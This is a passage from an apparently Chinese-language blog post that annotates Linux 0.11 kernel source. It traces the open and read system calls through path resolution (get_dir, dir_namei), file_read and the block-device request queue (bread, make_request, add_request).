节点号</span></span><br><span class="line">dev = dir-&gt;i_dev;<span class="comment">// 获得其所在设备号</span></span><br><span class="line">brelse(bh);<span class="comment">// 释放该高速缓冲块</span></span><br><span class="line">iput(dir);<span class="comment">// 放回目录的 i 节点</span></span><br><span class="line"><span class="keyword">if</span> (flag &amp; O_EXCL)<span class="comment">// 如果独占操作标志 O_EXCL 置位，返回出错码</span></span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line"><span class="keyword">if</span> (!(inode=iget(dev,inr)))<span class="comment">// 根据 i 节点号获得 &quot;hello.c&quot; 对应 i 节点指针</span></span><br><span class="line"><span class="keyword">return</span> -EACCES;<span class="comment">// 出错返回出错码</span></span><br><span class="line"><span class="comment">// 如果取得的 i 节点是一个目录的 i 节点，且访问模式是只读或读写，或者没有访问权限</span></span><br><span class="line"><span class="keyword">if</span> ((S_ISDIR(inode-&gt;i_mode) &amp;&amp; (flag &amp; O_ACCMODE)) ||</span><br><span class="line">    !permission(inode,ACC_MODE(flag))) &#123;</span><br><span class="line">iput(inode);<span class="comment">// 放回 i 节点，返回出错码</span></span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br><span class="line">inode-&gt;i_atime = CURRENT_TIME;<span class="comment">// 更新该 i 节点访问时间字段为当前时间</span></span><br><span class="line"><span class="keyword">if</span> (flag &amp; O_TRUNC)<span class="comment">// 如果有截零标志，则将文件长度截为 0</span></span><br><span class="line">truncate(inode);</span><br><span class="line">*res_inode = inode;<span class="comment">// 返回 &quot;/usr/root/hello.c&quot; 对应 i 节点指针</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么根据 “/usr/root/hello.c” 是怎样找到 “/usr/root” 的 i 节点指针的呢？其步骤类似 open_namei 中已知 “/usr/root” 的 i 节点指针（调用完 dir_namei 函数），获取 “hello.c” 的 i 节点指针。现已知根目录 “/“ i 节点指针，通过调用 find_entry，找到 “usr” 对应的目录项，从而得知其 i 节点号，再调用 iget 即可获取 “/usr” 的 i 节点指针；第二次调用 find_entry 在 “/usr” 目录下找到 “root” 对应的目录项，从而得知 “/usr/root” 的 i 节点号，调用 iget 获取 “/usr/root” 的 i 节点指针。理所当然地，能想到应该使用一个 whlie 循环来完成上述操作，下面是 dir_namei 函数的代码，其调用 get_dir 函数，在 get_dir 中通过 while 循环来获取 “/usr/root” 的 i 节点指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/namei.c Line 278</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct m_inode * <span class="title">dir_namei</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> * namelen, <span class="keyword">const</span> <span class="keyword">char</span> ** name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * basename;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">dir</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(dir = get_dir(pathname)))<span class="comment">// 获取 &quot;/usr/root&quot; 的 i 节点指针</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">// 失败返回 NULL</span></span><br><span class="line">basename = pathname;</span><br><span class="line"><span class="keyword">while</span> (c=get_fs_byte(pathname++))<span class="comment">// 使得 basename 指向 &quot;hello.c&quot;</span></span><br><span class="line"><span class="keyword">if</span> (c==<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">basename=pathname;</span><br><span class="line">*namelen = pathname-basename<span class="number">-1</span>;<span class="comment">// 计算 basename 的长度</span></span><br><span class="line">*name = basename;<span class="comment">// 返回 basename 指针及 &quot;/usr/root&quot; 的 i 节点指针</span></span><br><span class="line"><span class="keyword">return</span> dir;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 228</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct m_inode * <span class="title">get_dir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * thisname;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="keyword">int</span> namelen,inr,idev;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dir_entry</span> * <span class="title">de</span>;</span></span><br><span class="line"><span class="comment">// 当前进程的根与当前工作路径的 i 节点需存在且有效</span></span><br><span class="line"><span class="keyword">if</span> (!current-&gt;root || !current-&gt;root-&gt;i_count)</span><br><span class="line">panic(<span class="string">&quot;No root inode&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!current-&gt;pwd || !current-&gt;pwd-&gt;i_count)</span><br><span class="line">panic(<span class="string">&quot;No cwd inode&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((c=get_fs_byte(pathname))==<span class="string">&#x27;/&#x27;</span>) &#123;<span class="comment">// 如果是绝对路径 </span></span><br><span class="line">inode = current-&gt;root;<span class="comment">// 起始 inode 设置为根目录(或伪根)对应 i 节点指针</span></span><br><span class="line">pathname++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c)<span class="comment">// 否则是相对路径</span></span><br><span class="line">inode = current-&gt;pwd;<span class="comment">// 起始 inode 设置为当前工作路径对应 i 节点指针</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">inode-&gt;i_count++;<span class="comment">// 引用计数加 1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">// 开始逐层解析目录路径</span></span><br><span class="line">thisname = pathname;<span class="comment">// thisname 指向正在处理的目录名</span></span><br><span class="line"><span class="comment">// 如果不是目录或没有进入该目录的权限</span></span><br><span class="line"><span class="keyword">if</span> (!S_ISDIR(inode-&gt;i_mode) || !permission(inode,MAY_EXEC)) &#123;</span><br><span class="line">iput(inode);<span class="comment">// 放回 i 节点</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 搜索到下一个 &#x27;/&#x27;，如第一次循环时，namelen = 3（usr），pathname 指向 &quot;root/hello.c&quot;</span></span><br><span class="line"><span class="keyword">for</span>(namelen=<span class="number">0</span>;(c=get_fs_byte(pathname++))&amp;&amp;(c!=<span class="string">&#x27;/&#x27;</span>);namelen++)</span><br><span class="line"><span class="comment">/* nothing */</span> ;</span><br><span class="line"><span class="keyword">if</span> (!c)<span class="comment">// 如果已经搜索到路径名末尾</span></span><br><span class="line"><span class="keyword">return</span> inode;<span class="comment">// 返回 i 节点指针</span></span><br><span class="line"><span class="comment">// 在 inode 对应的目录下查找长度为 namelen 的 thisname 对应的目录项</span></span><br><span class="line"><span class="keyword">if</span> (!(bh = find_entry(&amp;inode,thisname,namelen,&amp;de))) &#123;</span><br><span class="line">iput(inode);<span class="comment">// 失败放回 i 节点</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">inr = de-&gt;inode;<span class="comment">// 获得 thisname 对应的 i 节点号</span></span><br><span class="line">idev = inode-&gt;i_dev;<span class="comment">// 获得设备号</span></span><br><span class="line">brelse(bh);<span class="comment">// 释放含有该目录项的高速缓冲块</span></span><br><span class="line">iput(inode);<span class="comment">// 放回 i 节点</span></span><br><span class="line"><span class="keyword">if</span> (!(inode = iget(idev,inr)))<span class="comment">// 获得设备号为 idev、i 节点号为 inr 的 i 节点指针</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，不再深入，回到 sys_open 函数。之前调用 open_namei 时，返回的 i 节点指针存储在 inode 中，现在要根据 i_mode 字段判断该文件的类型，对于不同类型的文件，需要做一些处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/open.c Line 163</span></span><br><span class="line"><span class="keyword">if</span> (S_ISCHR(inode-&gt;i_mode))<span class="comment">// 如果打开的是字符设备，无关，不作记录</span></span><br><span class="line"><span class="keyword">if</span> (MAJOR(inode-&gt;i_zone[<span class="number">0</span>])==<span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader &amp;&amp; current-&gt;tty&lt;<span class="number">0</span>) &#123;</span><br><span class="line">current-&gt;tty = MINOR(inode-&gt;i_zone[<span class="number">0</span>]);</span><br><span class="line">tty_table[current-&gt;tty].pgrp = current-&gt;pgrp;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (MAJOR(inode-&gt;i_zone[<span class="number">0</span>])==<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> (current-&gt;tty&lt;<span class="number">0</span>) &#123;</span><br><span class="line">iput(inode);</span><br><span class="line">current-&gt;filp[fd]=<span class="literal">NULL</span>;</span><br><span class="line">f-&gt;f_count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (S_ISBLK(inode-&gt;i_mode))<span class="comment">// 如果打开的是块设备</span></span><br><span class="line">check_disk_change(inode-&gt;i_zone[<span class="number">0</span>]);<span class="comment">//检查盘片是否被更换</span></span><br><span class="line">f-&gt;f_mode = inode-&gt;i_mode;<span class="comment">// 设置 file_table 中 file 结构体的一些属性</span></span><br><span class="line">f-&gt;f_flags = flag;</span><br><span class="line">f-&gt;f_count = <span class="number">1</span>;</span><br><span class="line">f-&gt;f_inode = inode;</span><br><span class="line">f-&gt;f_pos = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> (fd);<span class="comment">// 返回文件句柄</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时返回的 fd 应该为 3</p><br><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>read 也是一个系统调用，处理函数为 sys_read，现在要从已打开的 “/usr/root/hello.c” 中读取 79 个字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/read_write.c Line 55</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,<span class="keyword">char</span> * buf,<span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"><span class="comment">// 判断参数文件句柄与要读的字符数的合法性</span></span><br><span class="line"><span class="keyword">if</span> (fd&gt;=NR_OPEN || count&lt;<span class="number">0</span> || !(file=current-&gt;filp[fd]))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!count)<span class="comment">// count 为 0，表示一个字符都不读，返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">verify_area(buf,count);<span class="comment">// 验证存放数据的地址是否存在内存越界等问题</span></span><br><span class="line">inode = file-&gt;f_inode;<span class="comment">// 获得文件 i 节点指针</span></span><br><span class="line"><span class="keyword">if</span> (inode-&gt;i_pipe)<span class="comment">// 如果是管道文件，进行管道读操作</span></span><br><span class="line"><span class="keyword">return</span> (file-&gt;f_mode&amp;<span class="number">1</span>)?read_pipe(inode,buf,count):-EIO;</span><br><span class="line"><span class="keyword">if</span> (S_ISCHR(inode-&gt;i_mode))<span class="comment">// 如果是字符型文件，进行字符设备读操作</span></span><br><span class="line"><span class="keyword">return</span> rw_char(READ,inode-&gt;i_zone[<span class="number">0</span>],buf,count,&amp;file-&gt;f_pos);</span><br><span class="line"><span class="keyword">if</span> (S_ISBLK(inode-&gt;i_mode))<span class="comment">// 如果是块设备文件，进行块设备读操作</span></span><br><span class="line"><span class="keyword">return</span> block_read(inode-&gt;i_zone[<span class="number">0</span>],&amp;file-&gt;f_pos,buf,count);</span><br><span class="line"><span class="keyword">if</span> (S_ISDIR(inode-&gt;i_mode) || S_ISREG(inode-&gt;i_mode)) &#123;<span class="comment">// 是目录或普通文件</span></span><br><span class="line"><span class="keyword">if</span> (count+file-&gt;f_pos &gt; inode-&gt;i_size)<span class="comment">// 如果读写指针加上欲读字符数超出文件末尾</span></span><br><span class="line">count = inode-&gt;i_size - file-&gt;f_pos;<span class="comment">// 重新计算 count</span></span><br><span class="line"><span class="keyword">if</span> (count&lt;=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> file_read(inode,file,buf,count);<span class="comment">// 进行文件读操作</span></span><br><span class="line">&#125;</span><br><span class="line">printk(<span class="string">&quot;(Read)inode-&gt;i_mode=%06o\n\r&quot;</span>,inode-&gt;i_mode);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 “/usr/root/hello.c” 是一个<strong>普通文件</strong>，所以应该调用 <strong>file_read</strong> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/file_dev.c Line 17</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_read</span><span class="params">(struct m_inode * inode, struct file * filp, <span class="keyword">char</span> * buf, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> left,chars,nr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((left=count)&lt;=<span class="number">0</span>)<span class="comment">// 判断参数有效性</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (left) &#123;<span class="comment">// 如果还需要读取的字符数不为 0</span></span><br><span class="line"><span class="comment">// bmap 获取文件当前读写位置的数据块在设备上对应的逻辑块号</span></span><br><span class="line"><span class="keyword">if</span> (nr = bmap(inode,(filp-&gt;f_pos)/BLOCK_SIZE)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(bh=bread(inode-&gt;i_dev,nr)))<span class="comment">// 从设备上读取该逻辑块</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span><span class="comment">// bmap 失败，bh 置为空</span></span><br><span class="line">bh = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>file_read 还没有结束，先来看看 bread 函数的实现细节，该函数的作用是从指定设备号的设备中读取指定块号的数据到高速缓冲块中，返回值是缓冲块对应的缓冲头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/buffer.c Line 270</span></span><br><span class="line"><span class="comment">// dev 是设备号，block 是逻辑块号</span></span><br><span class="line"><span class="function">struct buffer_head * <span class="title">bread</span><span class="params">(<span class="keyword">int</span> dev,<span class="keyword">int</span> block)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(bh=getblk(dev,block)))<span class="comment">// 根据 dev 与 block 在高速缓冲区中申请一块缓冲块</span></span><br><span class="line">panic(<span class="string">&quot;bread: getblk returned NULL\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (bh-&gt;b_uptodate)<span class="comment">// 如果缓冲块中的数据时有效的，则可以直接使用</span></span><br><span class="line"><span class="keyword">return</span> bh;</span><br><span class="line">ll_rw_block(READ,bh);<span class="comment">// 调用底层块设备读写函数 ll_rw_block</span></span><br><span class="line">wait_on_buffer(bh);<span class="comment">// 当前进程睡眠，等待缓冲块解锁</span></span><br><span class="line"><span class="keyword">if</span> (bh-&gt;b_uptodate)<span class="comment">// 醒来后如果缓冲区已被更新，则返回</span></span><br><span class="line"><span class="keyword">return</span> bh;</span><br><span class="line">brelse(bh);<span class="comment">// 否则表示读操作失败，释放该缓冲区</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/blk_dev/ll_rw_blk.c Line 145</span></span><br><span class="line"><span class="comment">// 参数 rw 是操作类型（如读/写），bh 对应的缓冲块用于存储从块设备中读出的数据</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ll_rw_block</span><span class="params">(<span class="keyword">int</span> rw, struct buffer_head * bh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> major;</span><br><span class="line"><span class="comment">// 如果主设备号不存在，或者处理请求的函数不存在，停机</span></span><br><span class="line"><span class="keyword">if</span> ((major=MAJOR(bh-&gt;b_dev)) &gt;= NR_BLK_DEV ||</span><br><span class="line">!(blk_dev[major].request_fn)) &#123;</span><br><span class="line">printk(<span class="string">&quot;Trying to read nonexistent block-device\n\r&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">make_request(major,rw,bh);<span class="comment">// 否则创建请求项，并加入请求队列</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 88</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">make_request</span><span class="params">(<span class="keyword">int</span> major,<span class="keyword">int</span> rw, struct buffer_head * bh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> * <span class="title">req</span>;</span></span><br><span class="line"><span class="keyword">int</span> rw_ahead;</span><br><span class="line"><span class="comment">// 预读取与预写功能并非必要，若缓冲区已上锁，就不用管它，否则它只是一个一般的读/写操作</span></span><br><span class="line"><span class="keyword">if</span> (rw_ahead = (rw == READA || rw == WRITEA)) &#123;</span><br><span class="line"><span class="keyword">if</span> (bh-&gt;b_lock)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (rw == READA)</span><br><span class="line">rw = READ;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">rw = WRITE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不支持其他操作</span></span><br><span class="line"><span class="keyword">if</span> (rw!=READ &amp;&amp; rw!=WRITE)</span><br><span class="line">panic(<span class="string">&quot;Bad block dev command, must be R/W/RA/WA&quot;</span>);</span><br><span class="line">lock_buffer(bh);<span class="comment">// 缓冲头上锁</span></span><br><span class="line"><span class="comment">// 如果是写操作且已修改标志未置位，说明该块没有被修改，与块设备中相同，不必写回</span></span><br><span class="line"><span class="comment">// 如果是读操作且更新（有效）标志置位，说明该块已经被读入高速缓冲，不必再读取</span></span><br><span class="line"><span class="keyword">if</span> ((rw == WRITE &amp;&amp; !bh-&gt;b_dirt) || (rw == READ &amp;&amp; bh-&gt;b_uptodate)) &#123;</span><br><span class="line">unlock_buffer(bh);<span class="comment">// 解锁缓冲头并返回</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">repeat:<span class="comment">// 给读请求保留一些空间，防止数组被写请求占满，无法读数据</span></span><br><span class="line"><span class="keyword">if</span> (rw == READ)<span class="comment">// 如果是读请求，就从 request 数组末开始往前搜索空闲项</span></span><br><span class="line">req = request+NR_REQUEST;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// 如果是写请求，就从 request 数组 2/3 处开始往前搜索空闲项</span></span><br><span class="line">req = request+((NR_REQUEST*<span class="number">2</span>)/<span class="number">3</span>);</span><br><span class="line"><span class="keyword">while</span> (--req &gt;= request)<span class="comment">// 搜索空闲项，req-&gt;dev 为 -1 表示该项空闲</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;dev&lt;<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (req &lt; request) &#123;<span class="comment">// 如果已经搜索到 request 数组头</span></span><br><span class="line"><span class="keyword">if</span> (rw_ahead) &#123;<span class="comment">// 如果是预读/写请求，则释放缓冲头并退出</span></span><br><span class="line">unlock_buffer(bh);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">sleep_on(&amp;wait_for_request);<span class="comment">// 否则就睡眠，过会儿再搜索请求队列</span></span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置请求项各字段</span></span><br><span class="line">req-&gt;dev = bh-&gt;b_dev;<span class="comment">// 设备号</span></span><br><span class="line">req-&gt;cmd = rw;<span class="comment">// 操作类型</span></span><br><span class="line">req-&gt;errors=<span class="number">0</span>;<span class="comment">// 出错次数</span></span><br><span class="line">req-&gt;sector = bh-&gt;b_blocknr&lt;&lt;<span class="number">1</span>;<span class="comment">// 起始扇区</span></span><br><span class="line">req-&gt;nr_sectors = <span class="number">2</span>;<span class="comment">// 要操作的扇区数（两个扇区为一个块）</span></span><br><span class="line">req-&gt;buffer = bh-&gt;b_data;<span class="comment">// 高速缓冲块起始地址指针</span></span><br><span class="line">req-&gt;waiting = <span class="literal">NULL</span>;<span class="comment">// 等待该请求完成的进程</span></span><br><span class="line">req-&gt;bh = bh;<span class="comment">// 缓冲头</span></span><br><span class="line">req-&gt;next = <span class="literal">NULL</span>;<span class="comment">// 下个请求项置空</span></span><br><span class="line">add_request(major+blk_dev,req);<span class="comment">// 将请求项添加到 blk_dev[3](硬盘) 的请求队列中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 64</span></span><br><span class="line"><span class="comment">// 该函数将设置好的请求项 req 加入指定设备的请求处理队列</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_request</span><span class="params">(struct blk_dev_struct * dev, struct request * req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> * <span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">req-&gt;next = <span class="literal">NULL</span>;<span class="comment">// next 字段先置空</span></span><br><span class="line">cli();<span class="comment">// 关中断</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;bh)<span class="comment">// 设置缓冲头的已修改标志为 0</span></span><br><span class="line">req-&gt;bh-&gt;b_dirt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(tmp = dev-&gt;current_request)) &#123;<span class="comment">// 如果请求队列中没有请求项</span></span><br><span class="line">dev-&gt;current_request = req;<span class="comment">// 则将该请求项设置为当前处理请求项</span></span><br><span class="line">sti();<span class="comment">// 开中断</span></span><br><span class="line">(dev-&gt;request_fn)();<span class="comment">// 调用请求处理函数</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 来到这里表示设备的请求队列中存在其他请求，通过单向电梯算法将新请求插入请求队列中</span></span><br><span class="line"><span class="keyword">for</span> ( ; tmp-&gt;next ; tmp=tmp-&gt;next)</span><br><span class="line"><span class="keyword">if</span> ((IN_ORDER(tmp,req) ||</span><br><span class="line">    !IN_ORDER(tmp,tmp-&gt;next)) &amp;&amp;</span><br><span class="line">    IN_ORDER(req,tmp-&gt;next))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">req-&gt;next=tmp-&gt;next;</span><br><span class="line">tmp-&gt;next=req;</span><br><span class="line">sti();<span class="comment">// 开中断</span></span><br><span 